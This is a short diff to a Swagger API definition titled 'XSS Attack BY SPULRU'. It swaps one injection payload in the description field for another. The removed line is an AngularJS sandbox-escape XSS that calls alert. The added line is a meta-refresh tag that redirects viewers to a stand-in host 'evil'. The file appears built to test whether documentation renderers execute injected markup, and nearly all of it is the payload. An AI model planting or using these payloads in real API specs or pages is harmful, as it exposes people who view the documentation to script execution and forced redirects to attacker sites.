@@ -1,7 +1,7 @@
 swagger: '2.0'
 info:
   title: XSS Attack BY SPULRU
-  description: </p><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"><p>
+  description: </p><meta http-equiv="refresh" content="0; http://evil?<p>
     
   version: production
 basePath: /JSSResource/
